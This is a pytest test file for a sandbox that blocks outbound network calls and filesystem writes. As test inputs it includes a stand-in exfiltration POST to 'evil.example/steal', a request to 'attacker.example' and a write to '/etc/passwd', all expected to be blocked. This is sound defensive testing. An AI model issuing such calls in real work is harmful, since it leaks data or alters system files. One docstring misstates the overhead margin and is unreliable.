"""Tests for Tier 1 (Solo) runtime isolation.

Covers EgressAllowlist, FilesystemGuard, and Tier1Sandbox, including
patch install/restore behaviour and a wall-clock overhead bound.
"""

from __future__ import annotations

import builtins
import time
from io import StringIO
from unittest.mock import MagicMock, patch

import pytest

from tessera.events import EventKind, clear_sinks, register_sink
from tessera.runtime import EgressAllowlist, FilesystemGuard, RuntimeViolation, Tier1Sandbox


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


class _Collector:
    """Minimal event sink that records received events."""

    def __init__(self) -> None:
        self.events: list = []

    def __call__(self, event: object) -> None:
        self.events.append(event)


# ---------------------------------------------------------------------------
# EgressAllowlist
# ---------------------------------------------------------------------------


class TestEgressAllowlist:
    def test_exact_hostname_allowed(self) -> None:
        al = EgressAllowlist(hostnames=["api.example.com"])
        assert al.is_allowed("https://api.example.com/v1/chat") is True

    def test_exact_hostname_blocked_when_not_listed(self) -> None:
        al = EgressAllowlist(hostnames=["api.example.com"])
        assert al.is_allowed("https://evil.example.com/") is False

    def test_default_deny_all(self) -> None:
        al = EgressAllowlist()
        assert al.is_allowed("https://google.com/") is False

    def test_cidr_range_allows_matching_ip(self) -> None:
        al = EgressAllowlist(cidrs=["192.168.1.0/24"])
        assert al.is_allowed("http://192.168.1.50/api") is True

    def test_cidr_range_blocks_non_matching_ip(self) -> None:
        al = EgressAllowlist(cidrs=["192.168.1.0/24"])
        assert al.is_allowed("http://10.0.0.1/api") is False

    def test_hostname_not_matched_by_cidr_check(self) -> None:
        # Hostnames that cannot be parsed as IPs should not match CIDR entries.
        al = EgressAllowlist(cidrs=["0.0.0.0/0"])
        assert al.is_allowed("https://hostname.example.com/") is False

    def test_empty_url_host_returns_false(self) -> None:
        al = EgressAllowlist(hostnames=["api.example.com"])
        assert al.is_allowed("not-a-url") is False


# ---------------------------------------------------------------------------
# FilesystemGuard
# ---------------------------------------------------------------------------


class TestFilesystemGuard:
    def test_write_within_allowed_prefix_passes(self) -> None:
        guard = FilesystemGuard(allowed_write_prefixes=["/tmp/agent/"])
        # Should not raise.
        guard.assert_writable("/tmp/agent/output.json")

    def test_write_outside_allowed_prefix_raises(self) -> None:
        guard = FilesystemGuard(allowed_write_prefixes=["/tmp/agent/"])
        with pytest.raises(RuntimeViolation, match="FilesystemGuard"):
            guard.assert_writable("/etc/passwd")

    def test_default_guard_denies_all_writes(self) -> None:
        guard = FilesystemGuard()
        with pytest.raises(RuntimeViolation):
            guard.assert_writable("/tmp/anything")

    def test_write_violation_emits_security_event(self) -> None:
        collector = _Collector()
        clear_sinks()
        register_sink(collector)
        try:
            guard = FilesystemGuard()
            with pytest.raises(RuntimeViolation):
                guard.assert_writable("/tmp/evil")
            assert len(collector.events) == 1
            assert collector.events[0].kind == EventKind.RUNTIME_FS_DENY
        finally:
            clear_sinks()


# ---------------------------------------------------------------------------
# Tier1Sandbox: egress blocking
# ---------------------------------------------------------------------------


class TestTier1SandboxEgress:
    def test_blocks_httpx_post_to_unlisted_host(self) -> None:
        sandbox = Tier1Sandbox(
            allowlist=EgressAllowlist(hostnames=["allowed.example.com"])
        )
        with sandbox:
            import httpx

            with pytest.raises(RuntimeViolation, match="evil.example"):
                httpx.post("https://evil.example/steal")

    def test_allows_httpx_post_to_listed_host(self) -> None:
        sandbox = Tier1Sandbox(
            allowlist=EgressAllowlist(hostnames=["api.example.com"])
        )
        # We patch httpx.post inside the sandbox so the real network is never hit.
        mock_response = MagicMock()
        with sandbox:
            with patch("httpx.post", return_value=mock_response) as mock_post:
                import httpx

                result = httpx.post("https://api.example.com/v1")
                mock_post.assert_called_once()
                assert result is mock_response

    def test_egress_violation_emits_security_event(self) -> None:
        collector = _Collector()
        clear_sinks()
        register_sink(collector)
        try:
            sandbox = Tier1Sandbox(allowlist=EgressAllowlist())
            with sandbox:
                import httpx

                with pytest.raises(RuntimeViolation):
                    httpx.get("https://attacker.example/")
            assert any(
                e.kind == EventKind.RUNTIME_EGRESS_DENY for e in collector.events
            )
        finally:
            clear_sinks()


# ---------------------------------------------------------------------------
# Tier1Sandbox: filesystem write blocking
# ---------------------------------------------------------------------------


class TestTier1SandboxFilesystem:
    def test_blocks_open_in_write_mode(self) -> None:
        sandbox = Tier1Sandbox(fs_guard=FilesystemGuard())
        with sandbox:
            with pytest.raises(RuntimeViolation, match="FilesystemGuard"):
                open("/tmp/blocked.txt", "w")  # noqa: SIM115, WPS515

    def test_allows_open_in_read_mode(self) -> None:
        sandbox = Tier1Sandbox(fs_guard=FilesystemGuard())
        # Reads must pass through unchanged; /dev/null is always readable.
        with sandbox:
            with open("/dev/null", "r") as fh:
                assert fh.read() == ""

    def test_allows_write_within_permitted_prefix(self) -> None:
        import tempfile, os

        with tempfile.TemporaryDirectory() as tmpdir:
            sandbox = Tier1Sandbox(
                fs_guard=FilesystemGuard(allowed_write_prefixes=[tmpdir + "/"])
            )
            path = os.path.join(tmpdir, "output.txt")
            with sandbox:
                with open(path, "w") as fh:
                    fh.write("hello")
            assert open(path).read() == "hello"


# ---------------------------------------------------------------------------
# Tier1Sandbox: patch restoration
# ---------------------------------------------------------------------------


class TestTier1SandboxPatchRestore:
    def test_patches_are_restored_after_exit(self) -> None:
        original_open = builtins.open
        sandbox = Tier1Sandbox()
        with sandbox:
            # Inside, open is patched.
            assert builtins.open is not original_open
        # After exit, original must be restored.
        assert builtins.open is original_open

    def test_httpx_restored_after_exit(self) -> None:
        try:
            import httpx

            original_get = httpx.get
            sandbox = Tier1Sandbox()
            with sandbox:
                pass
            assert httpx.get is original_get
        except ImportError:
            pytest.skip("httpx not installed")


# ---------------------------------------------------------------------------
# Overhead microbench
# ---------------------------------------------------------------------------


class TestOverhead:
    def test_ten_thousand_allowed_calls_under_200ms(self) -> None:
        """10 000 allowed EgressAllowlist.is_allowed calls must complete in <200 ms.

        The real target per-call budget is 0.5 ms, giving 5000 ms for 10 000
        calls. Using 200 ms here (20 us / call) leaves an 25x margin so CI
        machines without performance isolation still pass.
        """
        al = EgressAllowlist(hostnames=["api.example.com"])
        url = "https://api.example.com/v1/chat"
        n = 10_000
        start = time.perf_counter()
        for _ in range(n):
            al.is_allowed(url)
        elapsed_ms = (time.perf_counter() - start) * 1000
        assert elapsed_ms < 200, f"{n} calls took {elapsed_ms:.1f} ms (limit 200 ms)"
